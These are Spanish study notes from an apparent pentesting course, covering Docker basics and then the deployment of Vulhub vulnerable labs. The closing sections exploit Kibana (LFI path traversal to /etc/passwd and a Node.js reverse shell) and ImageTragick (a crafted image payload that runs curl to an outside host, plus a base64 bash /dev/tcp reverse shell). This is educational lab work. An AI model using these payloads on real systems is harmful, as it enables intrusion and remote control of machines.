------
- Test: #contenedores #servidores #laboratorios #Linux #vulnerabilidades 
----
# Definición 

>**Docker** es una plataforma de **contenedores** de software que permite crear, distribuir y ejecutar aplicaciones en entornos aislados. Esto significa que se pueden empaquetar las aplicaciones con todas sus dependencias y configuraciones en un contenedor que se puede mover fácilmente de una máquina a otra, independientemente de la configuración del sistema operativo o del hardware. Esta plataforma está disponible en [[Linux]], Windows y otros SO.

Algunas de las ventajas que se presentan a la hora de practicar hacking usando Docker son:

- **Aislamiento**: los contenedores de Docker están aislados entre sí, lo que significa que si una aplicación dentro de un contenedor es comprometida, el resto del sistema no se verá afectado.
- **Portabilidad**: los contenedores de Docker se pueden mover fácilmente de un sistema a otro, lo que los hace ideales para desplegar entornos vulnerables para prácticas de hacking.
- **Reproducibilidad**: los contenedores de Docker se pueden configurar de forma precisa y reproducible, lo que es importante en el hacking para poder recrear escenarios de ataque.

Algo a tener en cuenta es que se puede de una manera mas avanzada, saltar de un contenedor a la maquina original.

----

Para crear un contenedor temporal que sea eliminado una vez se detenga podemos emplear el siguiente comando.

- ``docker run --rm -it ubuntu bash``

------
# Instalación de Docker de Linux

En el shell de Linux utilizar el comando **``apt install docker.io -y``**
Una vez que Docker ha sido instalado, es necesario iniciar el **demonio** de Docker para que los contenedores puedan ser creados y administrados. Para iniciar el demonio de Docker, se puede utilizar el comando **``service docker start``**. Este comando iniciará el servicio del demonio de Docker, que es responsable de gestionar los contenedores y asegurarse de que funcionen correctamente.

--------
# Definiendo la estructura básica de Dockerfile

Un archivo **Dockerfile** se compone de varias secciones, cada una de las cuales comienza con una **palabra clave** en **mayúsculas**, seguida de uno o más argumentos.
Algunas de las secciones más comunes en un archivo Dockerfile son:

- **FROM**: se utiliza para especificar la imagen base desde la cual se construirá la nueva imagen.
- **RUN**: se utiliza para ejecutar comandos en el interior del contenedor, como la instalación de paquetes o la configuración del entorno.
- **COPY**: se utiliza para copiar archivos desde el sistema host al interior del contenedor.
- **CMD**: se utiliza para especificar el comando que se ejecutará cuando se arranque el contenedor.
- **MAINTAINER**: se utiliza para especificar el usuario creador (Nombre, apellido, mail) de manera opcional.
- **EXPOSE**: se utiliza para definir en que puerto quiero que se ejecute el contenedor.
- **ENTRYPOINT**: define el comando que se ejecutará por defecto cuando se inicie un contenedor basado en la imagen. Siempre al final se recomienda utilizar un "&& /bin/bash" para que no se apague el contenedor y se mantenga desplegado.

Una **imagen de Docker no es mas que un archivo que contiene todo lo necesario para que una aplicación se pueda ejecutar en un contenedor**.
Normalmente lo que veremos es un archivo Dockerfile que contiene todas las instrucciones para poder crear la imagen.

Crearemos un archivo llamado "``Dockerfile``" para comenzar a definir su estructura.
Vamos a indicarle al archivo Dockerfile que de base queremos tener un UBUNTU en su ultima versión, para esto escribimos lo siguiente

- **``FROM ubuntu``**

Si no le colocas nada en donde dice "ubuntu" quedará así, pero también existe una etiqueta o concepto llamado TAG, para poder especificar una versión especifica. En este caso indicaremos que queremos la ultima versión de Ubuntu.

- **``FROM ubuntu:latest``**

Además de esto podríamos escribir lo siguiente para poder indicar quien es el que está montando la base para luego construir los contenedores.

```
FROM ubuntu:latest

MAINTAINER Pedro Sanchez
```

Con todo esto tan sencillo acabamos de construir una base FUNDAMENTAL para una vez creemos la IMAGEN poder crear un CONTENEDOR.

-------
# Creación y construcción de imágenes

#### Para crear una Imagen

Para crear una imagen de Docker, es necesario tener un archivo **``Dockerfile``** que defina la configuración de la imagen. Una vez que se tiene el Dockerfile, se puede utilizar el comando “**``docker build``**” para construir la imagen.

Para poder comenzar en la creación y construcción de imágenes utilizamos el comando

- **``docker build -t my_first_image .``**

Con el parámetro **``-t``** podemos asignarle un nombre o una etiqueta seguido del nombre con "``:``", con el **"``.``"** final es para que automáticamente busque en el directorio actual el archivo ``Dockerfile``. 

Ya con esto la habríamos creado, para verificarlo podemos usar el comando **``docker images``** que se utiliza para listar las imágenes de Docker que están disponibles en el sistema, la imagen que creamos actualmente aparecería ahí junto con la imagen de "``ubuntu``" en este caso, esa imagen es la que utilizaremos para ir metiéndole cambios a nivel de instrucciones en el ``Dockerfile`` y luego desplegar un contenedor.

-----
#### Para descargar una imagen con etiqueta

Aislado a esto también podemos descargar una imagen Docker desde un registro de imágenes con el comando **``docker pull``**

La sintaxis básica es la siguiente:

- **``docker pull nombre_de_la_imagen:etiqueta``**

Por ejemplo, si se desea descargar la imagen “ubuntu” con la etiqueta “latest”, se puede usar la siguiente sintaxis:

- **``docker pull ubuntu:latest``**

----
#### Para agregar mas instrucciones a Dockerfile

Si deseamos agregarle alguna instrucción mas al archivo ``Dockerfile`` podemos hacerlo en cualquier momento, pero siempre hay que actualizar los datos con el comando **``docker build -t my_first_image .``** en este caso.
Durante la construcción de la imagen, **Docker descargará y almacenará en caché las capas de la imagen que se han construido previamente** con el archivo ``Dockerfile``, lo que hace que las compilaciones posteriores **sean más rápidas**.

--------
# Carga de instrucciones en Docker y desplegando nuestro primer contenedor

El comando **``docker run``** se utiliza para crear y arrancar un contenedor a partir de una imagen. Algunas de las opciones más comunes para el comando “``docker run``” son:

- “**``-d``**” o “**``–detach``**“: se utiliza para arrancar el contenedor en segundo plano, en lugar de en primer plano.
- “**``-i``**” o “**``–interactive``**“: se utiliza para permitir la entrada interactiva al contenedor.
- “**``-t``**” o “**``–tty``**“: se utiliza para asignar un seudoterminal al contenedor.
- “**``--name``**“: se utiliza para asignar un nombre al contenedor.

Para arrancar un contenedor a partir de una imagen, se utiliza el siguiente comando:

- **``docker run [opciones] my_first_image``**

Por ejemplo, si se desea arrancar un contenedor a partir de la imagen **``my_first_image``**“, con el nombre **``myContainer``**, en segundo plano y con un seudoterminal asignado, se puede utilizar la siguiente sintaxis:

- **``docker run -dit --name myContainer my_first_image``**

Una vez que el contenedor está en ejecución, se puede utilizar el comando **``docker ps``** para listar los contenedores que están en ejecución en el sistema. Algunas de las opciones más comunes son:

- “**``-a``**” o “**``–all``**“: se utiliza para listar todos los contenedores, incluyendo los contenedores detenidos.
- “**``-q``**” o “**``–quiet``**“: se utiliza para mostrar sólo los identificadores numéricos de los contenedores.

Por ejemplo, si se desea listar todos los contenedores que están en ejecución en el sistema, se puede utilizar la siguiente sintaxis:

- **``docker ps -a``**

También podemos borrar las interfaces red o los contenedores e imágenes que se hayan creado en el despliegue mediante el siguiente comando

- **``docker rm $(docker ps -a -q) --force``**
- **``docker rmi $(docker images -a) --force``**
- **``docker network ls``**
- **``docker network rm $(docker network ls)``**

Para ejecutar comandos en un contenedor que ya está en ejecución, se utiliza el comando **``docker exec``** con diferentes opciones. Algunas de las opciones más comunes son:

- “**``-i``**” o “**``–interactive``**“: se utiliza para permitir la entrada interactiva al contenedor.
- “**``-t``**” o “**``–tty``**“: se utiliza para asignar un seudoterminal al contenedor.

Si desea ejecutar el comando **``bash``** en el contenedor con el identificador **``myContainer``**“, se puede utilizar la siguiente sintaxis:

- **``docker exec -it myContainer bash``**

Y de esta manera ya estaríamos dentro del contenedor con una ``bash``. Podemos utilizar las powerlines de la personalización para abrir una pestaña dentro de la terminal y operar en nuestra terminal nuevamente sin cerrar el container.

Algo a tener en cuenta es que una vez que instalemos un Container, este estará completamente **desnudo**, esto quiere decir que le faltaran muchísimas herramientas que ya teníamos por defecto en nuestro Parrot y debemos instalarlas manualmente.

Realizamos un **``apt update``**
Por ejemplo podríamos instalar las net-tools (Comandos básicos de información de IPs y redes) **``apt install net-tools -y``**
Instalamos **``apt install iputils-ping``**

Bien, ahora lo que podemos hacer es en nuestro ``Dockerfile`` (Archivo de configuración de imágenes) especificar de ante mano con ``RUN`` que una vez que se instale el contenedor, ya venga con los comandos de herramientas y actualizaciones anteriores y otras utilidades mas.

```dockerfile
RUN apt update && apt install -y net-tools \
nano \
curl \
git \
iputils-ping
```

Luego de esto actualizamos la información con **"``docker build -t my_first_image:v2 ."``** esta vez usando el **"``:v2``"** para identificar la segunda versión.
Podemos verificar que la nueva imagen existe con **``docker images``**.

------
# Comandos comunes para la gestión de contenedores

- **``docker rm $(docker ps -a -q) –force``**: este comando se utiliza para **eliminar todos los contenedores en el sistema**, incluyendo los **contenedores detenidos**. La opción “**``-q``**” se utiliza para mostrar sólo los identificadores numéricos de los contenedores, y la opción “**``--force``**” se utiliza para **forzar la eliminación de los contenedores que están en ejecución**. Es importante tener en cuenta que la eliminación de todos los contenedores en el sistema puede ser peligrosa, ya que puede borrar accidentalmente contenedores importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.

- **``docker rm id_contenedor``**: este comando se utiliza para **eliminar un contenedor específico a partir de su identificador**. Es importante tener en cuenta que la eliminación de un contenedor eliminará también cualquier cambio que se haya realizado dentro del contenedor, como la instalación de paquetes o la modificación de archivos.

- **``docker rmi $(docker images -q)``**: este comando se utiliza para **eliminar todas las imágenes de Docker en el sistema**. La opción “**``-q``**” se utiliza para mostrar sólo los identificadores numéricos de las imágenes. Es importante tener en cuenta que la eliminación de todas las imágenes de Docker en el sistema puede ser peligrosa, ya que puede borrar accidentalmente imágenes importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.

- **``docker rmi id_imagen``**: este comando se utiliza para **eliminar una imagen específica a partir de su identificador**. Es importante tener en cuenta que la eliminación de una imagen eliminará también cualquier contenedor que se haya creado a partir de esa imagen. Si se desea eliminar una imagen que tiene contenedores en ejecución, se deben detener primero los contenedores y luego eliminar la imagen.

- **``docker volume ls``**: este comando se utiliza para **ver los volúmenes, estos son "backups" de otros contenedores que hemos desplegado en otro momento**, y se utilizan para automáticamente a la hora de volver a montar un contenedor que previamente habíamos trabajado, vuelva al estado que lo teníamos antes.

- **``docker volume rm``**: este comando se utiliza para **eliminar volúmenes especificados para evitar backups que no queramos**.

- **``docker network ls``**: sirve para ver todas las interfaces de red creadas con docker.

- **``docker network rm $(docker network ls)``**: sirve para eliminar todas las interfaces de red creadas con docker.

------
# Comandos de Red para contenedores

Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

- `docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

- **``subnet``**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
- **``nombre_de_red``**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción ``--driver`` en el comando ``docker network create`` para especificar el controlador de red que deseamos utilizar.

Por ejemplo, si queremos crear una red de tipo “**``bridge``**“, podemos utilizar el siguiente comando:

- `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción ``--driver=bridge`` para indicar que deseamos crear una red de tipo “**bridge**“. La opción ``--driver`` nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.

------
# Port Forwarding en Docker y uso de monturas

## Port Forwarding (Reenvío de puertos)

El **Port Forwarding**, también conocido como reenvío de puertos, nos permitirá redirigir el tráfico de red desde un puerto específico en el host a un puerto específico en el contenedor, lo que nos permitirá acceder a los servicios que se ejecutan dentro del contenedor desde el exterior.

En este caso a nuestro archivo ``Dockerfile`` le agregaremos **"``apache2``"** para poder levantar el servicio de apache que corresponde a la típica web, para luego crear una pagina WEB, y también instalaremos **"``php``"** para poder interpretar código ``php``.

Ahora utilizaremos una instrucción nueva llamada **``ENTRYPOINT``**, para indicarle que comando quiere que se ejecute apenas se despliegue el contenedor basado en la imagen que previamente se ha construido. En este caso como instalamos Apache que es un servicio, tiene que estar levantado para que nos ofrezca el servidor WEB por el puerto **80** que especificaremos mas adelante. Debemos también agregarle **``/bin/bash``** para que nos ejecute la consola interactiva directamente y no que no se apague el contenedor ni bien lo ejecutemos.

Deberíamos agregar la siguiente instrucción a nuestro archivo Dockerfile

- **``ENTRYPOINT service apache2 start && /bin/bash``**

De igual manera como lo hicimos arrancar con el servicio de Docker, Apache debe estar activo para que corra por el puerto 80 con la plantilla web correspondiente.

Ahora lo que queremos hacer es que el puerto **80** de nuestra maquina **HOST**, sea **el mismo puerto 80 que el de nuestro contenedor**.
Ahora usaremos el PortForwarding.
Algo que se puede hacer **para evitar problema es lo siguiente, si tienes un aplicativo WEB**, puedes **construirlo dentro de un contenedor (Apache en este caso) para que contenga todo el aplicativo para exponerlo en producción** y en caso de que alguien encuentre una brecha o vulnerabilidad, **si la explota y gana acceso, no gane acceso a la maquina REAL si no al CONTENEDOR**

A continuación dentro del archivo DockerFile utilizaremos **``EXPOSE 80``** para exponer el puerto **80** y a la hora de entrar al contenedor **crear una regla para indicarle que el puerto 80 de nuestra maquina sea el mismo que el del contenedor**

Creamos nuestra imagen con **``docker build``** y lo que sucederá es que se creara una especie de interacción debido a las herramientas que instalamos, el problema es que estas interacciones serán dentro de la instalación y puede generarnos problemas. Para evitar este tipo de inconvenientes nos metemos denuevo en el archivo ``DockerFile`` y hacemos lo siguiente para evitar que entre en modo ``INTERACTIVO``.

- **``ENV DEBIAN_FRONTEND noninteractive``**

Una vez que ya por fin creemos nuestra imagen, vamos a utilizar **``docker run -dit --name myWebServer webserver``**
(``myWebServer`` y ``webserver`` es a modo de ejemplo en este caso, uno es el titulo del contenedor y el otro el titulo de la imagen).
Al anterior comando le agregaremos el PortForwarding de la siguiente manera 

- **``docker run -dit -p 80:80 --name myWebServer webserver``**

Si se desea especificar un protocolo diferente al protocolo TCP predeterminado, se puede utilizar la opción “**``-p``**” con un formato diferente. Por ejemplo, si se desea redirigir el puerto 80 del host al puerto 80 del contenedor utilizando el protocolo UDP, se puede utilizar la siguiente sintaxis

- **``docker run -p 80:80/udp mi_imagen``**

De esta forma **le estamos indicando que queremos que nuestro puerto 80 se convierta en el puerto 80 en el contenedor**.
De esta forma antes de crear el contenedor, podemos verificar con **``lsof -i:80``** ==(COMO ROOT)== en este caso, para ver que no hay nada corriendo por el puerto **80**, luego creamos el contenedor y volvemos a verificar con el mismo comando y con **``docker port nombre_de_contenedor``** para ver que ahora si.

Ya con esto que hicimos el PortForwarding está exitosamente creado, esto sirve para poder experimentar o jugar de una manera segura sin que este vinculado con nuestra MAQUINA ORIGINAL. **Podemos verificar también entrando a nuestro navegador y en el dominio escribir "``localhost``"** para poder ver que el **Apache** está siendo ejecutado correctamente. ==(Asegurar de no tener el Foxy Proxy activado)==
**Este servidor Web no es de algo que este montado desde nuestro equipo**, es del contenedor pero a través del PortForwarding hacemos que sea accesible a través de nuestra IP, de nuestro propio equipo local. **Cualquiera en la red que aplique un reconocimiento, verá que tengo el puerto 80 Abierto y podrá ver la pagina web solo que si la comprometiera o algo, no ganaría acceso a nuestro equipo**, si no al contenedor.

Todo esto se puede verificar ingresando al contenedor **``docker exec -it myWebServer bash``** en el directorio **``/var/www/html``**, porque cuando tienes Apache o Nginx, normalmente se suele tener esta ruta como la principal del servicio web, en este caso el "``index.html``" que está dentro.
Vamos a borrar ese archivo y recargar la pagina para verificar que no hay nada, luego crearemos un **"``index.php``"** ya que previamente lo instalamos en DockerFiles y debería interpretarlo.

Definiremos una estructura básica de php dentro del archivo

```php
>?php
	echo "Hola esto es una prueba"; 
?>
```

A la hora de volver a recargar la pagina nos aparecería "*Hola esto es una prueba*", de forma que si alguien descubriera una vulnerabilidad en nuestra pagina (Como nosotros colocando ese output de "Hola esto es una prueba", evitaremos que mediante Inyecciones de comandos maliciosos tomen el control de nuestro equipo, solo tomaran el control del contenedor.

-----
### Uso de Monturas y Copias

Las **monturas**, nos permitirán compartir un directorio o archivo entre el sistema host y el contenedor, lo que nos permitirá persistir la información entre ejecuciones de contenedores y compartir datos entre diferentes contenedores.

Es común en DOCKER desplegar un contenedor pero con MONTURAS
Supongamos que tienes un archivo "``Prueba.txt``" en el directorio de tu equipo original, lo que podemos hacer para llevar ese archivo al contenedor es utilizar el comando 

- **``docker run -dit -p 80:80 myWebServer webserver``** pero agregándole el parámetro siguiente **``-v (Ruta donde esté el archivo en equipo ORIGINAL):(Ruta donde queremos que esté dentro del CONTENEDOR)``**

A modo de ejemplo **``docker run -dit -p 80:80 -v /home/c4sp/Desktop/Docker/:/var/www/html/ myWebServer webserver``**

De esta forma podremos verificar reiniciando la web o dentro del directorio **``/var/www/html/``** que todo el contenido del directorio "Docker"
está dentro del directorio **``/var/www/html/``**. 
Hay que tener en cuenta que **si modificamos un archivo que está montado dentro del contenedor, también se modificará el archivo original** de nuestro equipo y **también de manera inversa, modificando el archivo desde nuestro equipo**, cambiaremos el del container.

Otra cosa que podemos hacer es que dentro del archivo ``DockerFile`` podemos ejecutar una instrucción para que cuando se ejecute el contenedor, el archivo "``prueba.txt``" o el contenido de nuestra carpeta "Docker" ya esté en el directorio que especifiquemos en el contenedor.
Esto se realiza con la instrucción **``COPY``**

- **``COPY prueba.txt /var/www/html/``**

Si esto lo ejecutamos veremos que se pasó correctamente.

--------
# Despliegue de máquinas vulnerables con Docker-Compose (1/2)

Vamos a comenzar a desplegar laboratorios vulnerables a través de Docker-Compose en nuestra maquina virtual. Hay que entender que con Docker podemos moldear nuestros contenedores de la manera que queramos, pero para poder hacerlo de una manera mucho mas sencilla y pre establecida, podemos utilizar Docker-Compose con herramientas ya definidas. Nos vamos a dirigir a nuestro navegador para ir al URL https://github.com/vulhub/vulhub, filtraremos por Kibana y nos meteremos en la primer carpeta.

**Dentro de esta carpeta se tocara el tema de LFI (Local File Inclusion) dentro de Kibana**, esta es una vulnerabilidad que veremos mas adelante en el curso. 
Básicamente **LFI es una vulnerabilidad que nos va a permitir de manera externa como atacantes** a la hora de auditar Kibana que posee una versión vulnerable (al LFI) que vamos a desplegar con Docker-Compose, **apuntar a un recurso interno de la maquina, teniendo la capacidad de listar el contenido un archivo especifico de la maquina vulnerada**.
Por ejemplo podríamos listar el contenido del directorio /etc/passwd de un servidor (En este caso Kibana) de manera externa. Hay casos posibles en los que un LFI podemos derivarlo a una ejecución remota de comandos (La cual es el caso de esta vuln). Podremos apuntar a un archivo malicioso diseñado con JS que nos permitirá ejecutar comandos.

En esta pagina, sea cual sea la vulnerabilidad que queramos desplegar, tendremos un archivo **``docker-compose.yml``** el cual contiene configuraciones pre establecidas para poder modificar el contenedor para dicho laboratorio.

Dato para clonar solamente una subcarpeta de GITHUB:
En vez de hacer un **"``git clone https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246``"** lo cual nos dará ERROR
Haremos **``svn checkout https://github.com/vulhub/vulhub/trunk/kibana/CVE-2018-17246``** Como podremos notar, borramos los dominios previos y colocamos la palabra **``trunk``** para poder descargar solo los directorios siguientes.

Luego de tener la carpeta con el archivo **``dockercompose.yml``** en nuestro sistema ejecutamos el siguiente comando

**``docker-compose up -d``** al ejecutarlo, este comando automáticamente buscará en el directorio actual el archivo **``docker-compose.yml``** y cargará imágenes y contenedores con las características especificas anteriormente dichas a Docker.

Si tenemos dificultades con el contenedor y notamos que el contenedor no se crea después de ejecutar **``docker-compose up -d``**, modificar un parámetro del sistema con el siguiente comando en la consola:
**``sudo sysctl -w vm.max_map_count=262144``**.

Ya con esto podemos chequear con **``docker ps -a``** o con **``docker images``** toda la información importada, y veremos que nuestro puerto **5601** estará abierto al igual que el puerto **5601** del contenedor (PortForwarding)

Luego de esto en la pagina de GITHUB anterior, iremos al titulo que dice **Vulnerability Reproduce**, allí encontraremos una linea de comando especifica. Esta linea de comando contiene un parámetro el cual es **apis** a través del cual puedes llegar a apuntar archivos internos de la maquina. Este parámetro, lo que debería permitir en este caso es apuntar a un archivo de un directorio principal dado, donde existen ciertos recursos. Se ve en este caso que esto no está sanitizado de forma que nos podemos salir del directorio actual del trabajo, ir hasta la raíz, aplicando un Directory Path Traversal, hasta la raíz del sistema operativo para luego apuntar a otro archivo no esperado, entre ello al **``/etc/passwd``**.

- ``http://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd ``
(Donde dice ``your-ip`` reemplazar por nuestra ip local)

Ahora desde consola hacemos un

- ``curl -s -X GET "https://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"``

``-s`` - es de silent para no ver el verbose del "``curl``"
``-X`` - es el método que quiero utilizar "``Get``"

Esto nos dará un error o no nos brindará información directamente, pero toda la información quedó almacenada dentro de los  **``docker-compose logs``**

Para poder explotar esta vulnerabilidad lo que debemos hacer es subir/crear un archivo JavaScript malicioso dentro de la maquina o contenedor donde está el Kibana activo. Utilizamos el comando **``docker-compose exec Kibana bash``** y nos metemos en el directorio **``/tmp/``**
==(TODO ESTO SE REALIZA SUPONIENDO QUE ENCONTRAMOS DE ALGUNA FORMA UNA VIA POTENCIAL DE SUBIR UN ARCHIVO AL SERVER)==

Busquemos en Google a modo de ejemplo un código de script para poder hacer un **Reverse shell**. Busquemos "``node js Reverse shell``" y utilicemos el script que encontremos. En este caso utilizaremos este 
https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell

Este código lo que hace es encargarse de que **en caso de ser interpretado en el navegador cuando apuntamos al archivo, que te envié una SH (Tipo de Shell) de forma interactiva a una IP por un puerto dado**. Nosotros como atacantes lo que debemos hacer es reemplazar nuestra IP y nuestro puerto dentro del código y ponernos en escucha con **nc** en ese puerto que colocamos. A esto se le dice **ingeniería inversa porque es la maquina victima la que nos envía la consola interactiva a nosotros**.

Lo que haremos ahora es dentro del directorio **``/tmp/``** ==(Puede ser en cualquier otro directorio)== crear un archivo llamado **"``reverse.js``"** donde pegaremos todo el contenido del codigo de github dentro, **reemplazado la IP por 172.17.0.1 y el PUERTO 443** La IP debe ser la propia, **en este caso la IP CONTAINER que figura cuando hacemos "``ifconfig``"**.

Ahora debemos ponernos en escucha por el puerto "443" con **``nc``** que fue el que colocamos previamente con los parámetros **"``-nlvp``"**

- **``nc -nlvp 443``**

Y volver a hacer un ``curl`` pero modificando el directorio de la URL para que el servidor de "``Kibana``" ejecute el archivo de reverse.js.

- **``curl -s -X GET "https://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/reverse.js"``**

Si todo va bien, en la terminal que estamos en escucha debería darnos la SHELL y ya tendríamos el control de la maquina.

Podemos utilizar el comando **``script /dev/null -c bash``** para que se nos otorgue una BASH.

-----
# Despliegue de máquinas vulnerables con Docker-Compose (2/2)

Trabajaremos con https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick

Esto lo que hará será montar un campo de subida de archivos que se va a encargar de procesar contenido multimedia. Por ejemplo le podemos subir fotos, GIF o lo que corresponda, y por detrás está **``imagemagick``** corriendo que **se encarga de procesar imágenes y contenidos multimedia**. Dependiendo de la versión posee vulnerabilidades. 

Hay una vulnerabilidad que se conoce como **``IMAGETRAGICK``** que lo que te permite es crear un archivo especialmente diseñado con un contenido malicioso, que al momento de procesamiento del contenido multimedia que hace imagemagick, nos va a permitir inyectar un comando en la maquina. Este archivo que vamos a subir es algo similar al ejemplo que se da en GITHUB.

Una vez despleguemos el contenedor de Imagemagick de la misma forma que en la unidad anterior, entraremos al **localhost:8080** para verificar la composición de la web.
En este caso **utilizaremos el Burpsuite con Foxy Proxy enlazados entre si**, algo a tener en cuenta es que ==por defecto el puerto que utiliza el contenedor de imagemagick es el "8080", el mismo que el del Burpsuite, por ende cambiaremos el puerto del proxy del Burpsuite al "8081"==

Una vez que estemos en el dominio de **localhost:8080** procederemos a activar con Burpsuite el **intercept** en la pestaña Proxy y el **Foxy Proxy**. A continuación crearemos un archivo de texto **"``prueba.txt``"** y le pondremos dentro **"Hola"** a modo de traza, buscando así intentar subirlo a la web y ver que nos detecta el Burpsuite. Una vez que consigamos respuestas en la pestaña de Proxy en formato RAW, debemos apretar **``CTRL+R``** para poder enviar la información recibida al **Repeater**.

**La pestaña Repeater es una herramienta que se utiliza para realizar repeticiones controladas de solicitudes HTTP para analizar y modificar fácilmente los parámetros de la solicitud y observar cómo afectan al comportamiento de la aplicación.**

Una vez **dentro de la pestaña de Repeater podemos apretar en la opción donde dice "Send" para poder enviar la solicitud y ver la respuesta del servidor** del lado derecho en formatos diferentes, el que mas vamos a usar es el PRETTY o el RAW.
Por lo que podemos observar es que los archivos con extensión .txt no le agradan a la web.

Antes de explotar el ImageTragick, vamos a hacer un **``CTRL+I``** para emitir todo al **Intruder**.

**La pestaña de Intruder es una herramienta poderosa utilizada para realizar ataques automatizados de fuerza bruta, fuzzing y otras formas de pruebas de seguridad en aplicaciones web.**

Dentro de la pestaña Intruder vamos a aplicar un ataque de fuerza bruta, con el tipo de ataque **Sniper**. Seleccionaremos donde pone **"``.txt``"** en la parte inferior donde figura el codigo de la petición de la web, luego de esto presionaremos la opción donde dice **"Add"** del lado derecho, esto lo que estará haciendo es añadir un campo a la selección hecha para identificarlo como un **Payload**, **similar al caso de WFUZZ utilizando la palabra FUZZ**. 

Ahora lo que hay que hacer es asignarle un diccionario, por ende iremos a la pestaña **Payloads** y donde dice "Payload Settings" mas abajo, agregarle la cantidad de extensiones que queramos probar.

Ahora iremos a la pestaña **Settings** y si bajamos encontraremos un titulo que dice **``GREP EXTRACT``**, esto lo que hará al momento de hacer Fuerza bruta en el resultado del lado del servidor, que de forma representativa nos añadiera una columna que nos permitiera ver la respuesta del lado del servidor pero únicamente el mensaje de **``UNSUPPORTED FYLE TYPE``**, porque cuando no ponga eso quiere decir que la extensión que ha probado ha devuelto una respuesta distinta, y en ocasiones hasta muestra cual es la respuesta porque el campo es el mismo.

Le daremos click a donde dice "``Add``" y **seleccionaremos toda la ultima linea donde dice Unsupported File Type y lo demás**. Esto lo que hará es crearnos una expresión regular mas arriba, luego le daremos a Ok.

Ya con todo esto definido únicamente debemos darle a donde dice **Start Attack** en naranja y mandaremos la ventana de los resultados al escritorio 4 con **``Wind+Shift+4``**.
En los resultados veremos que hay muchas coincidencias que no acepta, y otras que dicen **"``image size is:``"** lo cual significa que esas extensiones son validas, por lo tanto podemos deducir que las extensiones multimedias son validas.

Ahora lo que podemos hacer es buscar un código en internet de vulnerabilidad para magicktragick, en este caso utilizaremos el mismo brindado por el primer link de GITHUB que escribí.

##### Código

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|curl "www.leavesongs.com:8889)'
pop graphic-context
------WebKitFormBoundarymdcbmdQR1sDse9Et--
```

---
##### Modificaciones en BurpSuite

En donde pone **``curl "www.leavesong.com:8889``** colocaremos **``curl "172.17.0.1/testingRCE``"** donde esa IP es la de nuestro contenedor o IP DOCKER, y el **``testingRCE``** **(Testing Remote Code Execution)** es a modo de traza para ver si me deja mas adelante hacer un RCE.

En nuestra Shell escribiremos **"``python3 -m http.server 80``"** para crear un servidor HTTP por el puerto "80", de forma que si recibimos una petición debería de verla por ahí. Ahora le damos a **Send** al Burpsuite y vemos que nos aparece. 
En este caso nos devolvió respuesta "*GEST testingRCE*" esa petición nos la hizo la **172.21.0.2** el contenedor, por lo tanto tenemos EJECUCIÓN REMOTA DE COMANDOS. Lo critico ahora es que tenemos capacidad de ejecutar lo que queramos en la maquina a la que estamos atacando. (En este caso el contenedor)

En este caso de la misma manera que lo hicimos en la unidad anterior, podemos hacer un **Reverse Shell** para que la maquina nos brinde una consola a nosotros como atacantes. En el GITHUB nos representan un código en la parte de **"POC of getting a reverse shell"**, copiaremos todo.

Crearemos un archivo con la extensión **"``.gif``"** exactamente será **"``file.gif``"** el nombre no importa. A continuación decodificamos la cadena que está escrita en base64 con el comando

- **``echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d; echo``**

Ahí veremos esto **``/bin/bash -i >& /dev/tcp/45.32.43.49/8889 0>&1``** esta cadena lo que hace es enviar una Bash interactiva (``-i``) por el protocolo TCP, mediante una comunicación al ``/dev/tcp`` que es una ruta del sistema especial, que se verá mas adelante en el curso.
Lo que deberíamos hacer es reemplazar esa IP y el Puerto por los nuestros, pero todo debe estar en "**base64**".

Primero escribiríamos un **``echo``** con el parámetro **``-n``**" para que no nos aplique un salto de linea, seguido de toda la linea del comando con nuestros datos reemplazados.

- **``echo -n "/bin/bash -i >& /dev/tcp/172.17.0.1/4646 0>&1" | base64``**

El puerto puede ser cualquiera, y el resultado obtenido lo metemos en la cadena dentro del archivo reemplazando la antigua.

De esta manera ya tenemos hecho el archivo malicioso, si lo metemos dentro de la web como hacíamos antes, vamos a obtener una Shell en nuestra IP, teniendo el control de la maquina. 

Podemos utilizar el comando **``script /dev/null -c bash``** para que se nos otorgue una BASH.

-------